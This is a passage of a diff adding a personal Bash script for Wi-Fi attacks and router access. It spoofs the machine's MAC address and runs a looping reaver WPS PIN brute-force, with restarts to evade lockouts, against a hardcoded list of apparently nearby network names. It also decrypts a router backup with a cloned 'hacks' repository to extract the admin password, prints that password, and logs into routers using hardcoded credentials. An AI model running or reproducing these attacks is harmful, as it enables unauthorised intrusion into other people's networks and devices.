+#wpa_supplicant -B -i $wlinterface -c /etc/wpa_supplicant.conf -Dwext
+#sudo dhclient $wlinterface
+#wpa_supplicant -B -i $wlinterface -c <($ssid $key)
+}
+
+changemac() {
+bssidmc="C4:25:E9:BD:3D:8B"
+#MBP="e4:ce:8f:32:a5:86"
+sudo airmon-ng stop mon0 "$wlinterface"mon0 ;
+if [[ $1 =~ (on) ]]
+then
+sudo ifconfig $wlinterface down
+sleep 1
+sudo macchanger -m $bssidmc $wlinterface
+sleep 1
+sudo ifconfig $wlinterface up
+fi
+return 0
+}
+#changemac "on"
+
+reaverway() {
+ssidkey
+sudo airmon-ng stop mon0 "$wlinterface"mon0 ;
+sleep 3
+sudo airmon-ng start $wlinterface ;
+sleep 3
+#sudo wash -i mon0
+#sudo airodump-ng mon0
+#245
+essidlist=($(cat <<EOF
+JnTEPTY
+TheWarren
+netgear219
+OPTUS_5FD28F
+OPTUS_7ADF42
+netgear304
+DODO-04B8
+moto_tp_link
+EOF
+))
+essid=${essidlist[0]}
+echo $essid
+#bssid="E2:55:7D:48:32:7F"
+#sudo reaver -i mon0 -b $bssid -vvwKZ
+changemac "on" 
+while true ; do \
+until [[ -n $bssid ]] ; do bssid=$(awk '/'$essid'/{print $1}' <<< "$(nmcli -f BSSID,SSID,ACTIVE dev wifi list)") ; done &&\
+until [[ -n $channel ]] ; do channel=$(awk '/'$essid'/{print $1}' <<< "$(nmcli -f CHAN,SSID,ACTIVE dev wifi list)") ; done &&\
+sudo reaver -i mon0 -b $bssid -c $channel -vv --lock-delay=30 --fail-wait=60 --recurring-delay=5:10 &\
+sleep 60 ;\
+sudo killall reaver ;\
+echo "restart" ;\
+sleep 10 ;\
+done
+}
+
+
+connectwpspin() {
+#https://askubuntu.com/questions/120367/how-to-connect-to-wi-fi-ap-through-wps
+ssidkey
+#sudo airmon-ng start $wlinterface
+#sudo wash -i mon0
+#sudo service network-manager stop
+#sudo systemctl stop NetworkManager.service
+echo -e "ctrl_interface=/var/run/wpa_supplicant
+ctrl_interface_group=0
+update_config=1" | sudo tee /etc/wpa_supplicant.conf
+sudo rm -f /var/run/wpa_supplicant/$wlinterface
+sudo wpa_supplicant -B -Dwext -i$wlinterface -c/etc/wpa_supplicant.conf
+sudo wpa_cli status
+##wpa_state=INACTIVE
+sudo wpa_cli scan
+sleep 10
+sudo wpa_cli scan_result
+bssid=$(awk '/'$ssid'/{printf $1}' <<< "$(sudo wpa_cli scan_result)")
+sudo wpa_cli wps_reg $bssid $wpspin
+##OK
+#wait
+#CTRL-EVENT-CONNECTED
+sudo wpa_cli save
+sudo dhclient $wlinterface
+cat /etc/wpa_supplicant.conf
+sudo wpa_cli terminate
+sudo service network-manager restart
+}
+
+logintorouter() {
+ssidkey
+#https://www.makeuseof.com/answers/create-script-log-router-disable-wifi-double-clicking-icon/
+google-chrome --tab "$routerlogin"
+}
+
+
+listallfn() {
+trap "traprestart" INT
+listfn=($(awk '/(^'$1'\(\) {)/ {gsub("([(){])","");print}' $2))
+totalallfn=${#listfn[@]}
+for f in ${!listfn[@]} ; do
+#num=$(echo $f + 1 | bc)
+echo $[$f+1]".${listfn[f]}"
+done
+echo $[$totalallfn+1]".restartscript"
+
+read fnno
+n=$[$fnno-1]
+fn="${listfn[$[$fnno-1]]}"
+echo "$n.$fn"
+if [[ $fnno -eq $[$totalallfn+1] ]] ; then
+traprestart
+else
+$fn
+fi
+
+sleep 1
+trap SIGINT
+return 0
+}
+
+while true ; do
+listallfn "(reconnect|changemac|reaverway|connectwpspin|logintorouter)" $0
+done
+
+genhashcatdl() {
+return 0
+}
+capfilechecker() {
+return 0
+}
+
+
+#######
+decryptsettings() {
+sudo pip install pycrypto
+git clone https://github.com/mattimustang/optus-sagemcom-fast-3864-hacks
+python decrypt-conf.py backupsettings.conf
+adminp=$(awk '/<AdminPassword>/{printf $1}' ./backupsettings.conf.txt | sed -r 's/(AdminPassword|<|>|[/])//g' | base64 -d)
+#0ptU%1M5
+#http://admin:0ptU%1M5@192.168.0.1/main.html
+}
+
+supplicantex=$(cat <<EOF
+ctrl_interface=/var/run/wpa_supplicant
+ctrl_interface_group=0
+update_config=1
+
+
+network={
+	ssid="$ssid"
+	psk="$passkey"
+	proto=RSN
+	key_mgmt=WPA-PSK
+	pairwise=CCMP
+	auth_alg=OPEN
+}
+EOF
+)
+
+genkey(){
+sudo rm -f /etc/NetworkManager/system-connections/$ssid
+echo "[connection]
+id=$ssid
+uuid=
+type=wifi
+permissions=
+secondaries=
+
+[wifi]
+mac-address=$macadd
+mac-address-blacklist=
+mac-address-randomization=0
+mode=infrastructure
+seen-bssids=
+ssid=$ssid
+
+[wifi-security]
+auth-alg=open
+group=
+key-mgmt=wpa-psk
+pairwise=
+proto=
+psk=$key
+
+[ipv4]
+dns-search=
+method=auto
+
+[ipv6]
+addr-gen-mode=stable-privacy
+dns-search=
+method=auto" | sudo tee -a /etc/NetworkManager/system-connections/$ssid
+sudo service network-manager restart
+sleep 3
+}
+
+loginoldtorouter() {
+USERNAME="admin"
+PASSWORD="Belong"
+HOST=10.0.0.138
+#URL=/reliance/login.do
+URL=""
+#QUERY=?action=doLoginSubmit
+QUERY=""
+
+CONTENT="userId=$USERNAME&password=$PASSWORD"
+CONTENT_LENGTH=`echo $CONTENT|wc -c`
+
+HEADERS="Host: $HOST\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\r\nConnection: close\r\n"
+REQUEST="GET $URL HTTP/1.1\r\n$HEADERS\r\n"
+echo -en "REQUEST:\r\n$REQUEST\r\n\r\n"
+echo RESPONSE:
+RESPONSE=`echo -en $REQUEST | nc $HOST 80`
+echo "$RESPONSE"
+
+COOKIES=`echo "$RESPONSE"|grep -i ^Set-Cookie:|sed -e "s/Set-Cookie: \?/\1/" -e "s/;.*//"|tr -s '\r\n' \;|sed -e "s/;$//"`
+HEADERS="${HEADERS}Cookie: $COOKIES\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CONTENT_LENGTH\r\nReferrer: http://$HOST$URL\r\n"
+REQUEST="POST $URL$QUERY HTTP/1.1\r\n$HEADERS\r\n$CONTENT"                                                                                                  
+echo -en "REQUEST:\r\n$REQUEST\r\n\r\n"                                                                                                                     
+echo RESPONSE:                                            
+echo -en $REQUEST | nc $HOST 80
+
+#https://superuser.com/questions/640839/how-to-enter-login-information-for-a-website-from-the-linux-command-line
+USERNAME="admin"
+PASSWORD="Belong"
+URL="10.0.0.138"
+curl --user $USERNAME:$PASSWORD http://$URL -v
+curl -b cookies.txt -c cookies.txt --data "Username=$USERNAME&Password=$PASSWORD&Login=Login" $URL
+curl --data "Username=$USERNAMEPassword=$PASSWORD&Login=Login" $URL
+
+sudo apt-get install -y elinks
+elinksautologin=$(cat <<EOF
+# Save username and password for later use
+set document.browse.forms.show_formhist = 1
+# Do not ask for confirmation before a form is submitted
+set document.browse.forms.confirm_submit = 0
+EOF
+)
+echo "$elinksautologin" | tee ~/.elinks/elinks.conf
+timeout 1m elinks -auto-submit http://$URL &
+
+sudo apt-get install -y lynx
+echo "username=$USERNAME&password=$PASSWORD" | lynx "$URL" -post_data
+
+google-chrome --tab "admin:Belong@10.0.0.138"
+}
+}
+###4connectwifikey
+#####FNENGINE
+traprestart() {
+trap SIGINT
+gnome-terminal -e "$0" & disown
+sleep 0.5
+exit
+return 0
+}
+
+populatefn() {
+if [[ -n "$3" ]] ; then
+startno="$3"
+else
+startno="0"
+fi
+allfn=$(awk '/(^'$1'\(\) {)/ {gsub("([(){])","");print}' $2)
+popfn="${popfn}"$'\n'"$allfn"
+allfnarray=($allfn)
+popfnarray=($popfn)
+totalallfn=$[${#allfnarray[@]}+$startno]
+#echo "$totalallfn"
+}
+
+printallfn() {
+for f in ${!popfnarray[@]} ; do
+echo $[$f+1]".${popfnarray[f]}"
+done
+}
+
+choosefn() {
+read fnno
+n=$[$fnno-1]
+fn="${popfnarray[$[$fnno-1]]}"
+echo "$n.$fn"
+if [[ $fn =~ (getmacrv9) ]] ; then
+creategmrsc
+#sleep 6000
+gnome-terminal -e "sudo $extfunc" & disown
+#[[ $fnno -eq $[$totalallfn+1] ]]
+elif [[ $fn =~ (wpspintext|connectwifikey) ]] ; then
+clear
+$fn
+elif [[ $fn =~ (traprestart) ]] ; then
+createextsc
+$fn
+else
+createextsc
+sourcefn "$fn" "$0" "$extfunc"
+echo "$fn" | tee -a "$extfunc"
+gnome-terminal -e "$extfunc" & disown
+#$fn
+fi
+return 0
+}
+
+
+runlistfn() {
+while true ; do
+trap "traprestart" INT
+popfn=""
+populatefn "(installaircrackng|linkdir|restartwlinterface|cleanaplist|listallw|checkcap)" "$0"
+populatefn "(getmacrv9|wpspintext|connectwifikey)" "$0" "$totalallfn"
+populatefn "(traprestart)" "$0" "$totalallfn"
+printallfn
+choosefn
+trap SIGINT
+done
+}
+runlistfn
